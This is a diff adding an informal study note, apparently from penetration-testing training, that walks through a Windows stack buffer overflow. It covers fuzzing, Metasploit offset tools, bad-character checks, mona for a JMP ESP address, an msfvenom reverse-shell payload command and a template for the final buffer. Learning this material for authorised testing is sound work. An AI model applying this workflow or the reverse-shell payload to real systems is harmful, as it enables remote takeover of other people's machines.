@@ -1,0 +1,33 @@
+How to do a buffer overflow with magic access to the target.
+1. First, spike the program and try to see if it is vulnerable to a buffer overflow attack.
+
+2. Then, use a fuzzer to try and gauge the approximate amount of bytes that you need to overflow the buffer and crash the program.
+
+3. After that, use /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number of bytes>. To create a offset to send and find the EIP address. For some reason the EIP appears on the Immunity Debugger after crashing the program? 
+
+4. Use /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <number of bytes> -q <EIP offset found magically in the last step> to then find the exact offset of the EIP from the beginning of the program's memory allocation.
+
+5. We then need to find the bad characters in the program so the shellcode we send actully works. We send the overflow bytes + some junk to fill the EIP + all badchars. We then look at the hex dump magically in Immunity Debugger by looking at the ESP in the hex dump. If there are any out of place characters, we would make sure to note them for the payload later.
+
+6. We then need to find a vulnerable module that has no memory protections. We will use mona to magically find it on the target computer.
+    - JMP ESP is FFE4 in Hex code. 
+    - Type !mona modules to list the modules and their safties.
+    - Then, you can use that module in "!mona find -s "\xff\xe4" -m 
+    <vulnerable module>
+    - This will then show us any return addresses within the module,
+    meaning that we will get a piece of code from the module that we will
+    jump to with the EIP, but the address will just return us right back
+    to where we jumped from and execute our code.
+
+7. Then, we need to generate the code we want to run along with a nopsled.
+    The nopsled is just some padding so no code interferes or something.
+    Then we can generate the payload with something like:
+    msfvenom -p windows/shell_reverse_tcp LHOST=<host ip> LPORT=<host port>
+    EXITFUNC=thread -f c -a  x86 -b "<bad characters>"
+   
+8. We can then attach that after the return address and nopsled, then the 
+    code will be executed.
+
+In the end the shell code should look like this:
+    shellcode = "A" * <buffer size> + "<return address>" + "\x90(or anything)" * 32 + shellcommandpayload
+    
